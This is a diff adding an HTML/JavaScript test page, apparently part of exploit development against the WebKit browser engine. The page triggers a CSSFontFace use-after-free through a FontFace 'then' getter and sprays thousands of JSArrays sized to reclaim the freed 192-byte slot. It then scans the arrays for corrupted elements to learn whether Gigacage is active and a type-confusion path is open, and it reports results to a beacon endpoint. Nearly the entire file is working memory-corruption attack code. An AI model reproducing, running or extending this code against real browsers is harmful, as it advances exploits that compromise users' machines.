@@ -1,0 +1,141 @@
+<!--
+  p600: Butterfly/Gigacage discrimination test
+
+  QUESTION: Do JSArray butterfly allocations share bmalloc pages with
+  CSSFontFace (192B)? If yes → engine writes corrupt array elements →
+  type confusion path opens. If no (Gigacage active) → path dead.
+
+  METHOD:
+  1. Trigger FontFace UAF (free CSSFontFace, 192B slot available)
+  2. Spray JSArrays whose butterfly is ~192B (22-23 doubles)
+  3. Engine continuation writes rc/T/W/mayBePurged into freed slot
+  4. Scan arrays for corruption: element value changed from sentinel
+
+  EXPECTED CORRUPTION MAP (if butterfly reclaims the 192B slot):
+    allocation+0x00: rc (4B)  → publicLength in butterfly header
+    allocation+0x58: T  (8B)  → element[10]  (0x58-8)/8
+    allocation+0x68: W  (8B)  → element[12]  (0x68-8)/8
+    allocation+0x85: 0  (1B)  → element[15]  partial byte
+
+  EXPECTED IF GIGACAGE ON: zero corruption, all sentinels intact.
+
+  CRASH_CLASS: MODERATE (header corruption may confuse JSC)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p600</title>
+<style id="v1">@font-face{font-family:sa;src:local(Arial);unicode-range:U+0042}</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function f64hex(v){
+  var ab=new ArrayBuffer(8),f=new Float64Array(ab),u=new Uint8Array(ab);
+  f[0]=v;var s='';
+  for(var i=7;i>=0;i--)s+=('0'+u[i].toString(16)).slice(-2);
+  return '0x'+s;
+}
+
+var SENTINEL = -98765.4321;
+var stage=0;
+var arrays=null;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+get:function(){
+  if(stage===0){stage=1;
+    document.getElementById('v1').remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    b('FREE');
+
+    arrays=[];
+    // 23-element arrays: butterfly = 8 header + 23*8 = 192B (exact CSSFontFace size)
+    for(var i=0;i<2048;i++){
+      var a=new Array(23);
+      for(var j=0;j<23;j++) a[j]=SENTINEL;
+      arrays.push({a:a,n:23});
+    }
+    // 22-element arrays: butterfly = 8 + 22*8 = 184B (may share 192B size class)
+    for(var i=0;i<1024;i++){
+      var a=new Array(22);
+      for(var j=0;j<22;j++) a[j]=SENTINEL;
+      arrays.push({a:a,n:22});
+    }
+    b('SPRAY:'+arrays.length+'(2048x23+1024x22)');
+    return;
+  }
+  return;
+},set:function(){}});
+
+function scan(label){
+  if(!arrays){b(label+':NO-SPRAY');return;}
+
+  var hitCount=0,lenHits=0,elemHits=0,errHits=0;
+  var details=[];
+
+  for(var i=0;i<arrays.length;i++){
+    var entry=arrays[i], a=entry.a, expected=entry.n;
+    try{
+      // Length check: ref() writes 4B at +0x00 → publicLength
+      if(a.length!==expected){
+        lenHits++;
+        if(details.length<10) details.push('LEN:i='+i+',n='+expected+',got='+a.length);
+        hitCount++;
+      }
+
+      // Element scan: T at +0x58 → elem[10], W at +0x68 → elem[12]
+      var limit=Math.min(expected,23);
+      for(var j=0;j<limit;j++){
+        try{
+          var v=a[j];
+          if(v!==SENTINEL){
+            elemHits++;
+            if(details.length<10)
+              details.push('ELEM:i='+i+',n='+expected+',j='+j+',hex='+f64hex(v)+',f='+v);
+            hitCount++;
+            break;
+          }
+        }catch(e2){
+          errHits++;
+          if(details.length<10) details.push('RERR:i='+i+',j='+j+',e='+e2.message);
+          hitCount++;
+          break;
+        }
+      }
+    }catch(e){
+      errHits++;
+      if(details.length<10) details.push('SERR:i='+i+',e='+e.message);
+      hitCount++;
+    }
+  }
+
+  b(label+':total='+arrays.length+',hits='+hitCount+
+    ',len='+lenHits+',elem='+elemHits+',err='+errHits);
+
+  for(var d=0;d<details.length;d++) b('D:'+details[d]);
+
+  if(hitCount>0){
+    b('★BUTTERFLY-HIT:'+hitCount);
+    b('VERDICT:GIGACAGE-OFF-OR-SHARED');
+  } else {
+    b('BUTTERFLY-MISS');
+    b('VERDICT:GIGACAGE-ACTIVE');
+  }
+}
+
+function main(){
+  b('P600-BUTTERFLY-GIGACAGE');
+
+  var pa=new FontFace('pa','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(pa);void pa.loaded;
+  document.fonts.load('1em pa, sa','AB').then(function(){},function(){});
+
+  // Scan at 300ms (engine write is synchronous after trap return)
+  setTimeout(function(){scan('SCAN1');},300);
+
+  // Second scan at 1.5s (catch delayed writes if any)
+  setTimeout(function(){scan('SCAN2');},1500);
+
+  setTimeout(function(){b('ALIVE');},3000);
+}
+
+setTimeout(main,0);
+setTimeout(function(){location.reload();},8000);
+</script></head><body>p600</body></html>
